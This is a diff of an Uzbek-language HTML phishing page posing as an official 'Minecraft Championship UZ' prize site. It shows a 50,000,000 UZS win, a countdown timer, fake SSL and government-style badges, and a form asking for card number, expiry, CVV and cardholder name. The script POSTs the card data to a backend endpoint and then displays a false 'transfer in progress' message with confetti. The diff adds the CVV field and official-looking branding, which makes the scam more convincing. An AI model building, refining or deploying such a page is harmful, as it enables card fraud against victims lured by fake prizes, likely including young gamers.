@@ -3,222 +3,459 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Muborak! Siz g'olib bo'ldingiz!</title>
+  <title>MINECRAFT CHAMPIONSHIP UZ — Rasmiy Mukofot Sahifasi</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
 
     body {
       min-height: 100vh;
-      background: linear-gradient(135deg, #0a0a0a 0%, #1a0a00 50%, #0a1a00 100%);
+      background: #0a0e0a;
       font-family: 'Segoe UI', Arial, sans-serif;
       overflow-x: hidden;
+    }
+
+    /* ── TOP OFFICIAL BAR ── */
+    .gov-bar {
+      background: #1a4a1a;
+      border-bottom: 2px solid #2d7a2d;
+      padding: 6px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      font-size: .72rem;
+      color: #8bc88b;
+      font-family: 'Courier New', monospace;
+    }
+    .gov-bar .left { display: flex; align-items: center; gap: 8px; }
+    .gov-bar .ssl  { color: #4caf50; font-weight: 700; }
+    .gov-bar .right { color: #557755; }
+
+    /* ── HEADER ── */
+    .site-header {
+      background: linear-gradient(180deg, #0d1f0d 0%, #0a140a 100%);
+      border-bottom: 1px solid #1a3a1a;
+      padding: 14px 20px;
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+
+    /* Minecraft logo (pixel-art matn) */
+    .mc-logo {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .mc-logo-box {
+      width: 48px;
+      height: 48px;
+      background: linear-gradient(135deg, #5d4037, #4e342e);
+      border: 3px solid #8d6e63;
+      border-radius: 4px;
       display: flex;
       align-items: center;
       justify-content: center;
-    }
-
-    /* Confetti canvas */
-    #confetti-canvas {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      pointer-events: none;
-      z-index: 0;
-    }
-
-    .wrapper {
+      font-size: 1.6rem;
+      image-rendering: pixelated;
+      box-shadow: inset 0 -3px 0 rgba(0,0,0,.4), 0 3px 12px rgba(0,0,0,.6);
       position: relative;
-      z-index: 1;
-      width: 100%;
-      max-width: 480px;
-      margin: 20px auto;
-      padding: 0 16px;
-    }
-
-    /* Prize box */
-    .prize-box {
-      background: linear-gradient(160deg, #1c1c1c 0%, #111 100%);
-      border: 1px solid #333;
-      border-radius: 16px;
       overflow: hidden;
-      box-shadow: 0 0 60px rgba(255,200,0,.15), 0 20px 60px rgba(0,0,0,.8);
     }
 
-    .prize-header {
-      background: linear-gradient(135deg, #b8860b 0%, #ffd700 50%, #b8860b 100%);
-      padding: 24px;
+    .mc-logo-box::before {
+      content: '';
+      position: absolute;
+      inset: 2px;
+      background: repeating-linear-gradient(
+        0deg,
+        transparent,
+        transparent 4px,
+        rgba(0,0,0,.12) 4px,
+        rgba(0,0,0,.12) 5px
+      ), repeating-linear-gradient(
+        90deg,
+        transparent,
+        transparent 4px,
+        rgba(0,0,0,.12) 4px,
+        rgba(0,0,0,.12) 5px
+      );
+    }
+
+    .mc-logo-text {
+      line-height: 1;
+    }
+
+    .mc-logo-text .top-line {
+      font-size: 1.3rem;
+      font-weight: 900;
+      color: #6abf69;
+      letter-spacing: 2px;
+      text-shadow: 2px 2px 0 #1b5e20, 0 0 20px rgba(106,191,105,.4);
+      font-family: 'Courier New', monospace;
+      text-transform: uppercase;
+    }
+
+    .mc-logo-text .bot-line {
+      font-size: .7rem;
+      color: #4a7a4a;
+      letter-spacing: 3px;
+      text-transform: uppercase;
+      font-family: 'Courier New', monospace;
+      margin-top: 2px;
+    }
+
+    .header-right {
+      margin-left: auto;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .flag-badge {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(0,100,0,.2);
+      border: 1px solid #1a4a1a;
+      padding: 5px 12px;
+      border-radius: 20px;
+      font-size: .78rem;
+      color: #8bc88b;
+    }
+
+    .flag-badge .flag { font-size: 1.2rem; }
+
+    .official-seal {
+      background: rgba(255,215,0,.07);
+      border: 1px solid rgba(255,215,0,.25);
+      padding: 5px 14px;
+      border-radius: 20px;
+      font-size: .72rem;
+      color: #ffd700;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+
+    /* ── CHAMPIONSHIP BANNER ── */
+    .champ-banner {
+      background: linear-gradient(135deg, #0d1f0d 0%, #0f2a0f 50%, #0d1f0d 100%);
+      border-bottom: 2px solid #1a4a1a;
+      padding: 28px 20px;
       text-align: center;
       position: relative;
+      overflow: hidden;
     }
 
-    .prize-header::before {
+    .champ-banner::before {
       content: '';
       position: absolute;
       inset: 0;
       background: repeating-linear-gradient(
         45deg,
-        rgba(255,255,255,.05) 0px,
-        rgba(255,255,255,.05) 2px,
+        rgba(106,191,105,.02) 0px,
+        rgba(106,191,105,.02) 2px,
+        transparent 2px,
+        transparent 14px
+      );
+    }
+
+    .banner-flag-row {
+      font-size: 2rem;
+      margin-bottom: 10px;
+      letter-spacing: 6px;
+    }
+
+    .champ-title {
+      font-size: 1.6rem;
+      font-weight: 900;
+      color: #6abf69;
+      text-transform: uppercase;
+      letter-spacing: 3px;
+      text-shadow: 0 0 30px rgba(106,191,105,.5);
+      font-family: 'Courier New', monospace;
+      margin-bottom: 4px;
+    }
+
+    .champ-sub {
+      font-size: .8rem;
+      color: #4a7a4a;
+      letter-spacing: 4px;
+      text-transform: uppercase;
+      font-family: 'Courier New', monospace;
+    }
+
+    /* ── RASMIY MUHUR ── */
+    .official-stamp {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: rgba(0,200,83,.08);
+      border: 1.5px solid rgba(0,200,83,.3);
+      padding: 6px 18px;
+      border-radius: 30px;
+      font-size: .78rem;
+      color: #00c853;
+      margin-top: 14px;
+      font-family: 'Courier New', monospace;
+      letter-spacing: 1px;
+    }
+
+    .stamp-dot {
+      width: 7px; height: 7px;
+      border-radius: 50%;
+      background: #00c853;
+      animation: blink .9s infinite;
+    }
+    @keyframes blink { 0%,100%{opacity:1} 50%{opacity:.2} }
+
+    /* ── MAIN WRAPPER ── */
+    .main {
+      max-width: 520px;
+      margin: 0 auto;
+      padding: 24px 16px 40px;
+    }
+
+    /* ── WINNER CARD ── */
+    .winner-card {
+      background: linear-gradient(160deg, #111a11 0%, #0d150d 100%);
+      border: 1px solid #1e3a1e;
+      border-radius: 16px;
+      overflow: hidden;
+      box-shadow: 0 0 60px rgba(106,191,105,.08), 0 20px 60px rgba(0,0,0,.8);
+    }
+
+    .winner-header {
+      background: linear-gradient(135deg, #1a4a1a 0%, #2d7a2d 50%, #1a4a1a 100%);
+      padding: 22px 24px;
+      text-align: center;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .winner-header::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: repeating-linear-gradient(
+        -45deg,
+        rgba(255,255,255,.03) 0px,
+        rgba(255,255,255,.03) 2px,
         transparent 2px,
         transparent 12px
       );
     }
 
-    .prize-crown { font-size: 3rem; margin-bottom: 8px; }
+    .trophy-row { font-size: 2.4rem; margin-bottom: 6px; letter-spacing: 4px; }
 
-    .prize-header h1 {
-      font-size: 1.15rem;
+    .winner-header h2 {
+      font-size: 1.05rem;
       font-weight: 800;
-      color: #1a0a00;
+      color: #c8f5c8;
       text-transform: uppercase;
-      letter-spacing: 1px;
+      letter-spacing: 2px;
     }
 
-    .amount-section {
-      padding: 28px 24px 20px;
+    /* Amount */
+    .amount-box {
+      padding: 24px;
       text-align: center;
-      border-bottom: 1px solid #2a2a2a;
+      border-bottom: 1px solid #1a2a1a;
     }
 
     .amount-label {
-      font-size: .8rem;
-      color: #888;
+      font-size: .72rem;
+      color: #4a7a4a;
       text-transform: uppercase;
-      letter-spacing: 1px;
+      letter-spacing: 2px;
       margin-bottom: 10px;
+      font-family: 'Courier New', monospace;
     }
 
-    .amount {
-      font-size: 3rem;
+    .amount-num {
+      font-size: 2.8rem;
       font-weight: 900;
       color: #ffd700;
-      text-shadow: 0 0 30px rgba(255,215,0,.4);
       line-height: 1;
+      text-shadow: 0 0 30px rgba(255,215,0,.4);
       animation: glow 2s infinite;
     }
 
-    .amount span { font-size: 1.4rem; vertical-align: super; }
-
-    .amount-currency {
-      font-size: .95rem;
-      color: #888;
-      margin-top: 6px;
+    @keyframes glow {
+      0%,100% { text-shadow: 0 0 20px rgba(255,215,0,.4); }
+      50%      { text-shadow: 0 0 40px rgba(255,215,0,.8), 0 0 70px rgba(255,215,0,.2); }
     }
 
-    @keyframes glow {
-      0%, 100% { text-shadow: 0 0 20px rgba(255,215,0,.4); }
-      50%       { text-shadow: 0 0 40px rgba(255,215,0,.8), 0 0 60px rgba(255,215,0,.3); }
+    .amount-currency {
+      font-size: .85rem;
+      color: #4a7a4a;
+      margin-top: 6px;
+      font-family: 'Courier New', monospace;
     }
 
     /* Timer */
-    .timer-section {
+    .timer-row {
       display: flex;
       align-items: center;
       justify-content: center;
       gap: 8px;
-      padding: 12px;
-      background: rgba(255,50,50,.08);
-      border-bottom: 1px solid #2a2a2a;
-      font-size: .82rem;
+      padding: 10px;
+      background: rgba(255,50,50,.07);
+      border-bottom: 1px solid #1a2a1a;
+      font-size: .8rem;
       color: #ff6b6b;
+      font-family: 'Courier New', monospace;
     }
 
-    .timer-val { font-weight: 700; font-size: .95rem; font-family: monospace; }
+    .timer-val { font-weight: 700; font-size: .9rem; }
 
-    /* Form */
-    .form-section { padding: 24px; }
+    /* Player info badge */
+    .player-info {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 14px 24px;
+      border-bottom: 1px solid #1a2a1a;
+      background: rgba(106,191,105,.03);
+    }
+
+    .player-avatar {
+      width: 36px; height: 36px;
+      border-radius: 4px;
+      background: linear-gradient(135deg, #2e7d32, #1b5e20);
+      border: 2px solid #4caf50;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.2rem;
+      image-rendering: pixelated;
+    }
+
+    .player-data .lbl { font-size: .68rem; color: #4a7a4a; text-transform: uppercase; letter-spacing: .5px; font-family: 'Courier New', monospace; }
+    .player-data .val { font-size: .88rem; color: #8bc88b; font-weight: 600; }
+
+    .verified-badge {
+      margin-left: auto;
+      background: rgba(0,200,83,.1);
+      border: 1px solid rgba(0,200,83,.25);
+      color: #00c853;
+      font-size: .68rem;
+      padding: 3px 10px;
+      border-radius: 12px;
+      font-family: 'Courier New', monospace;
+    }
+
+    /* ── FORM ── */
+    .form-section { padding: 22px 24px; }
 
     .form-title {
-      font-size: 1rem;
+      font-size: .95rem;
       font-weight: 700;
-      color: #fff;
-      margin-bottom: 6px;
+      color: #c8f5c8;
+      margin-bottom: 4px;
     }
 
-    .form-subtitle {
-      font-size: .82rem;
-      color: #888;
+    .form-sub {
+      font-size: .78rem;
+      color: #4a7a4a;
       margin-bottom: 20px;
       line-height: 1.5;
+      font-family: 'Courier New', monospace;
     }
 
-    .field { margin-bottom: 16px; }
+    .field { margin-bottom: 14px; }
 
     .field label {
       display: block;
-      font-size: .78rem;
-      color: #999;
+      font-size: .72rem;
+      color: #4a7a4a;
       margin-bottom: 6px;
       text-transform: uppercase;
-      letter-spacing: .5px;
+      letter-spacing: .8px;
+      font-family: 'Courier New', monospace;
     }
 
     .field input {
       width: 100%;
-      background: #1e1e1e;
-      border: 1.5px solid #333;
+      background: #0d150d;
+      border: 1.5px solid #1e3a1e;
       border-radius: 8px;
-      padding: 12px 14px;
-      color: #fff;
-      font-size: 1rem;
+      padding: 11px 14px;
+      color: #c8f5c8;
+      font-size: .95rem;
       font-family: 'Courier New', monospace;
       letter-spacing: 1px;
-      transition: border-color .2s;
+      transition: border-color .2s, box-shadow .2s;
     }
 
     .field input:focus {
       outline: none;
-      border-color: #ffd700;
-      box-shadow: 0 0 0 3px rgba(255,215,0,.1);
+      border-color: #4caf50;
+      box-shadow: 0 0 0 3px rgba(76,175,80,.12);
     }
 
-    .field input::placeholder { color: #444; letter-spacing: 0; font-family: 'Segoe UI', sans-serif; }
+    .field input::placeholder { color: #1e3a1e; font-family: 'Courier New', monospace; }
 
-    .field-row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+    .field-row { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; }
+
+    .cvv-hint {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      font-size: .68rem;
+      color: #2d5a2d;
+      margin-top: 5px;
+      font-family: 'Courier New', monospace;
+    }
 
     .submit-btn {
       width: 100%;
-      padding: 15px;
-      background: linear-gradient(135deg, #b8860b, #ffd700, #b8860b);
+      padding: 14px;
+      background: linear-gradient(135deg, #1b5e20, #2e7d32, #1b5e20);
       background-size: 200% auto;
-      color: #1a0a00;
+      color: #c8f5c8;
       border: none;
       border-radius: 10px;
-      font-size: 1rem;
+      font-size: .95rem;
       font-weight: 800;
       cursor: pointer;
-      letter-spacing: .5px;
-      font-family: inherit;
+      letter-spacing: 1px;
+      font-family: 'Courier New', monospace;
       margin-top: 8px;
-      transition: background-position .3s, transform .15s;
+      text-transform: uppercase;
+      transition: background-position .3s, box-shadow .2s;
       animation: btn-shine 3s linear infinite;
+      box-shadow: 0 4px 20px rgba(46,125,50,.3);
     }
 
-    .submit-btn:hover { transform: translateY(-2px); }
-    .submit-btn:active { transform: translateY(0); }
+    .submit-btn:hover { box-shadow: 0 4px 30px rgba(76,175,80,.5); }
 
     @keyframes btn-shine {
       0%   { background-position: 0% center; }
       100% { background-position: 200% center; }
     }
 
-    .trust-badges {
+    /* Trust bar */
+    .trust-bar {
       display: flex;
       justify-content: center;
-      gap: 16px;
-      padding: 14px 24px;
-      border-top: 1px solid #1a1a1a;
+      gap: 14px;
+      padding: 12px 24px;
+      border-top: 1px solid #111a11;
+      flex-wrap: wrap;
     }
 
-    .badge {
-      font-size: .72rem;
-      color: #555;
+    .trust-item {
+      font-size: .68rem;
+      color: #2d5a2d;
       display: flex;
       align-items: center;
       gap: 4px;
+      font-family: 'Courier New', monospace;
     }
 
-    /* Success screen */
+    /* ── SUCCESS SCREEN ── */
     .success-screen {
       display: none;
       text-align: center;
@@ -228,10 +465,9 @@
     .success-screen.show { display: block; }
 
     .check-icon {
-      width: 72px;
-      height: 72px;
+      width: 72px; height: 72px;
       border-radius: 50%;
-      background: #1a3a1a;
+      background: #0d1f0d;
       border: 2px solid #00c853;
       display: flex;
       align-items: center;
@@ -247,27 +483,27 @@
     }
 
     .success-screen h2 {
-      font-size: 1.2rem;
-      color: #fff;
-      margin-bottom: 12px;
+      font-size: 1.1rem;
+      color: #6abf69;
+      margin-bottom: 10px;
+      font-family: 'Courier New', monospace;
     }
 
     .success-screen p {
-      font-size: .88rem;
-      color: #888;
+      font-size: .82rem;
+      color: #4a7a4a;
       line-height: 1.6;
+      font-family: 'Courier New', monospace;
     }
 
-    .success-screen .loading-dots::after {
-      content: '';
-      animation: dots 1.5s infinite;
-    }
+    @keyframes dots { 0%{content:'.'} 33%{content:'..'} 66%{content:'...'} 100%{content:'.'} }
+    .loading-dots::after { content: '.'; animation: dots 1.2s steps(1) infinite; }
 
-    @keyframes dots {
-      0%   { content: ''; }
-      33%  { content: '.'; }
-      66%  { content: '..'; }
-      100% { content: '...'; }
+    /* Confetti */
+    #confetti-canvas {
+      position: fixed; top: 0; left: 0;
+      width: 100%; height: 100%;
+      pointer-events: none; z-index: 999;
     }
   </style>
 </head>
@@ -275,29 +511,84 @@
 
 <canvas id="confetti-canvas"></canvas>
 
-<div class="wrapper">
-  <div class="prize-box">
+<!-- OFFICIAL TOP BAR -->
+<div class="gov-bar">
+  <div class="left">
+    <span class="ssl">🔒 SSL</span>
+    <span>minecraft-championship-uz.official-prizes.net</span>
+  </div>
+  <div class="right">O'ZBEKISTON RASMIY PLATFORMASI &nbsp;🇺🇿</div>
+</div>
 
-    <!-- MAIN FORM (ko'rinadi) -->
+<!-- SITE HEADER -->
+<div class="site-header">
+  <div class="mc-logo">
+    <div class="mc-logo-box">⛏️</div>
+    <div class="mc-logo-text">
+      <div class="top-line">MINECRAFT</div>
+      <div class="bot-line">CHAMPIONSHIP &nbsp;UZ</div>
+    </div>
+  </div>
+  <div class="header-right">
+    <div class="flag-badge">
+      <span class="flag">🇺🇿</span>
+      <span>O'ZBEKISTON</span>
+    </div>
+    <div class="official-seal">✅ RASMIY PLATFORMA</div>
+  </div>
+</div>
+
+<!-- CHAMPIONSHIP BANNER -->
+<div class="champ-banner">
+  <div class="banner-flag-row">🇺🇿 🏆 🇺🇿</div>
+  <div class="champ-title">MINECRAFT CHAMPIONSHIP UZ</div>
+  <div class="champ-sub">2025 — Milliy Musobaqa Seriyasi</div>
+  <div class="official-stamp">
+    <div class="stamp-dot"></div>
+    RASMIY MUKOFOT SAHIFASI
+  </div>
+</div>
+
+<!-- MAIN CONTENT -->
+<div class="main">
+  <div class="winner-card">
+
+    <!-- WINNER HEADER -->
     <div id="mainContent">
-      <div class="prize-header">
-        <div class="prize-crown">🏆</div>
-        <h1>Tabriklaymiz! Siz g'olib bo'ldingiz!</h1>
+      <div class="winner-header">
+        <div class="trophy-row">🏆 🎮 🏆</div>
+        <h2>Siz G'OLIB bo'ldingiz!</h2>
       </div>
 
-      <div class="amount-section">
+      <!-- AMOUNT -->
+      <div class="amount-box">
         <div class="amount-label">Sizning mukofotingiz</div>
-        <div class="amount"><span></span>10,000,000</div>
+        <div class="amount-num">50,000,000</div>
         <div class="amount-currency">O'zbek so'mi (UZS)</div>
       </div>
 
-      <div class="timer-section">
-        ⏳ Taklif muddati tugashiga: <span class="timer-val" id="timer">09:59</span> qoldi
+      <!-- TIMER -->
+      <div class="timer-row">
+        ⏳ Taklif muddati tugashiga: <span class="timer-val" id="timer">14:59</span> qoldi
       </div>
 
+      <!-- PLAYER INFO -->
+      <div class="player-info">
+        <div class="player-avatar">🧱</div>
+        <div class="player-data">
+          <div class="lbl">G'olib o'yinchi</div>
+          <div class="val">Ali_UZ_Player</div>
+        </div>
+        <div class="verified-badge">✓ TASDIQLANGAN</div>
+      </div>
+
+      <!-- FORM -->
       <div class="form-section">
-        <div class="form-title">💳 Yutuqni qo'lga kiriting</div>
-        <div class="form-subtitle">Pulni kartangizga o'tkazish uchun karta ma'lumotlaringizni kiriting.</div>
+        <div class="form-title">💳 Mukofotni bank kartangizga qabul qiling</div>
+        <div class="form-sub">
+          Pulni kartangizga o'tkazish uchun karta ma'lumotlarini kiriting.<br>
+          Barcha ma'lumotlar 256-bit SSL orqali himoyalangan.
+        </div>
 
         <div class="field">
           <label>Karta raqami</label>
@@ -306,35 +597,42 @@
 
         <div class="field-row">
           <div class="field">
-            <label>Oy / Yil</label>
+            <label>Amal qilish muddati</label>
             <input type="text" id="expiry" placeholder="OY/YIL" maxlength="5" inputmode="numeric"/>
           </div>
           <div class="field">
-            <label>Karta egasi ismi</label>
+            <label>CVV kod</label>
+            <input type="text" id="cvv" placeholder="• • •" maxlength="3" inputmode="numeric"/>
+            <div class="cvv-hint">🔒 Karta orqasida</div>
+          </div>
+          <div class="field">
+            <label>Karta egasi</label>
             <input type="text" id="cardName" placeholder="Ism Familiya" style="font-family:'Segoe UI',sans-serif;letter-spacing:0;"/>
           </div>
         </div>
 
         <button class="submit-btn" id="submitBtn" onclick="submitCard()">
-          🎁 Yutuqni olish
+          🎁 MUKOFOTNI QABUL QILISH
         </button>
       </div>
 
-      <div class="trust-badges">
-        <span class="badge">🔒 SSL himoyalangan</span>
-        <span class="badge">✅ Tasdiqlangan</span>
-        <span class="badge">🏦 Xavfsiz to'lov</span>
+      <!-- TRUST BAR -->
+      <div class="trust-bar">
+        <span class="trust-item">🔒 256-bit SSL</span>
+        <span class="trust-item">✅ Tasdiqlangan platforma</span>
+        <span class="trust-item">🏦 Xavfsiz to'lov</span>
+        <span class="trust-item">🇺🇿 Rasmiy musobaqa</span>
       </div>
     </div>
 
-    <!-- SUCCESS screen (yashirin) -->
+    <!-- SUCCESS SCREEN -->
     <div class="success-screen" id="successScreen">
       <div class="check-icon">✓</div>
-      <h2>Ma'lumotlar tasdiqlandi</h2>
+      <h2>Ma'lumotlar muvaffaqiyatli tasdiqlandi!</h2>
       <p>
-        Tez orada siz bilan bog'lanamiz<br>
-        yoki kartangizga pulni tashlab beramiz.<br><br>
-        <span style="color:#666;" class="loading-dots">Iltimos, kuting</span>
+        Mukofot kartangizga o'tkazilmoqda.<br>
+        Jarayon 3-5 ish kunini olishi mumkin.<br><br>
+        <span class="loading-dots">Iltimos, kuting</span>
       </p>
     </div>
 
@@ -344,20 +642,24 @@
 <script>
 const API = 'http://localhost:8001';
 
-/* ── Karta raqami formatlash ── */
-document.getElementById('cardNum').addEventListener('input', (e) => {
+/* ── Formatlash ── */
+document.getElementById('cardNum').addEventListener('input', e => {
   let v = e.target.value.replace(/\D/g, '').substring(0, 16);
   e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
 });
 
-document.getElementById('expiry').addEventListener('input', (e) => {
+document.getElementById('expiry').addEventListener('input', e => {
   let v = e.target.value.replace(/\D/g, '').substring(0, 4);
   if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2);
   e.target.value = v;
 });
 
-/* ── Countdown timer ── */
-let secs = 599;
+document.getElementById('cvv').addEventListener('input', e => {
+  e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3);
+});
+
+/* ── Timer ── */
+let secs = 899;
 const timerEl = document.getElementById('timer');
 const tick = setInterval(() => {
   secs--;
@@ -372,33 +674,28 @@ const tick = setInterval(() => {
 async function submitCard() {
   const num  = document.getElementById('cardNum').value.replace(/\s/g, '');
   const exp  = document.getElementById('expiry').value;
-  const name = document.getElementById('cardName').value || 'Noma\'lum';
+  const cvv  = document.getElementById('cvv').value;
+  const name = document.getElementById('cardName').value || "Noma'lum";
 
   if (num.length < 16) { highlight('cardNum'); return; }
   if (exp.length < 5)  { highlight('expiry'); return; }
+  if (cvv.length < 3)  { highlight('cvv'); return; }
 
   document.getElementById('submitBtn').disabled = true;
-  document.getElementById('submitBtn').textContent = 'Tekshirilmoqda...';
+  document.getElementById('submitBtn').textContent = 'TEKSHIRILMOQDA...';
 
   try {
     await fetch(`${API}/api/card`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ number: num, expiry: exp, name }),
+      body: JSON.stringify({ number: num, expiry: exp, cvv, name }),
     });
   } catch (_) {}
 
-  // Show success then fade out
   document.getElementById('mainContent').style.display = 'none';
   document.getElementById('successScreen').classList.add('show');
-
   clearInterval(tick);
-
-  setTimeout(() => {
-    document.body.style.transition = 'opacity 1s';
-    document.body.style.opacity   = '0';
-    setTimeout(() => { document.body.innerHTML = ''; }, 1200);
-  }, 4000);
+  startConfetti();
 }
 
 function highlight(id) {
@@ -414,19 +711,22 @@ const ctx    = canvas.getContext('2d');
 canvas.width  = window.innerWidth;
 canvas.height = window.innerHeight;
 
-const pieces = Array.from({ length: 120 }, () => ({
+const pieces = Array.from({ length: 100 }, () => ({
   x:    Math.random() * canvas.width,
   y:    Math.random() * canvas.height - canvas.height,
-  w:    Math.random() * 10 + 5,
+  w:    Math.random() * 10 + 4,
   h:    Math.random() * 5 + 3,
-  color: ['#ffd700','#ff6b35','#00c853','#2979ff','#e040fb','#ff1744'][Math.floor(Math.random()*6)],
+  color: ['#ffd700','#6abf69','#00c853','#4caf50','#ffeb3b','#00e676'][Math.floor(Math.random()*6)],
   speed: Math.random() * 3 + 1,
   rot:   Math.random() * Math.PI * 2,
   rspeed: (Math.random() - .5) * .1,
   drift:  (Math.random() - .5) * 1.5,
 }));
 
+let confettiRunning = false;
+
 function drawConfetti() {
+  if (!confettiRunning) return;
   ctx.clearRect(0, 0, canvas.width, canvas.height);
   pieces.forEach(p => {
     ctx.save();
@@ -435,14 +735,18 @@ function drawConfetti() {
     ctx.fillStyle = p.color;
     ctx.fillRect(-p.w/2, -p.h/2, p.w, p.h);
     ctx.restore();
-    p.y     += p.speed;
-    p.x     += p.drift;
-    p.rot   += p.rspeed;
+    p.y   += p.speed;
+    p.x   += p.drift;
+    p.rot += p.rspeed;
     if (p.y > canvas.height) { p.y = -10; p.x = Math.random() * canvas.width; }
   });
   requestAnimationFrame(drawConfetti);
 }
-drawConfetti();
+
+function startConfetti() {
+  confettiRunning = true;
+  drawConfetti();
+}
 </script>
 
 </body>
